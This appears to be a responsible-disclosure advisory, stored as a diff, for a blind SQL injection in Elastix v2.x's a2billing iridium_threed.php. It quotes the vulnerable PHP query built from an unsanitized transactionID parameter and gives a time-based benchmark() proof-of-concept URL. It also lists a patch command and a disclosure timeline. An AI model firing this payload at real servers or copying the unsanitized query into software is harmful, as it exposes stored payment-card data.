@@ -1,0 +1,47 @@
+# Title: Elastix v2.x Blind SQL Injection Vulnerability
+# Author: Ahmed Aboul-Ela
+# Twitter: https://twitter.com/aboul3la
+# Vendor : http://www.elastix.org
+# Version: v2.5.0 and prior versions should be affected too
+ 
+- Vulnerable Source Code snippet in "a2billing/customer/iridium_threed.php":
+ 
+  <?php
+  [...]
+  line 5: getpost_ifset (array('transactionID', 'sess_id', 'key', 'mc_currency', 'currency', 'md5sig', 
+  'merchant_id', 'mb_amount', 'status','mb_currency','transaction_id', 'mc_fee', 'card_number'));
+
+  line 34: $QUERY = "SELECT id, cardid, amount, vat, paymentmethod, cc_owner, cc_number, cc_expires, 
+  creationdate, status, cvv, credit_card_type,currency, item_id, item_type " . 
+  " FROM cc_epayment_log " . " WHERE id = ".$transactionID;
+
+  line 37: $transaction_data = $paymentTable->SQLExec ($DBHandle_max, $QUERY);
+  [...]
+  ?>    
+  
+   The GET parameter transactionID was used directly in the SQL query 
+   without any sanitization which lead directly to SQL Injection vulnerability.
+ 
+- Proof of Concept: 
+ 
+  http://[host]/a2billing/customer/iridium_threed.php?transactionID=-1 and 1=benchmark(2000000,md5(1))
+  
+  The backend response will delay for few seconds, which means the benchmark() function was executed successfully
+ 
+- Mitigation:
+   
+   The vendor has released a fix for the vulnerability. It is strongly recommended to update your elastix server now
+   
+   [~] yum update elastix-a2billing
+ 
+ 
+- Time-Line:
+ 
+    Sat, Feb 14, 2015 at 2:19 PM: Vulnerability report sent to Elastix
+    Wed, Feb 18, 2015 at 4:29 PM: Confirmation of the issue from Elastix
+    Fri, Mar  6, 2015 at 8:39 PM: Elastix released a fix for the vulnerability
+    Sat, Mar  7, 2015 at 5:15 PM: The public responsible disclosure
+
+- Credits:
+ 
+    Ahmed Aboul-Ela - Cyber Security Analyst @ EG-CERT
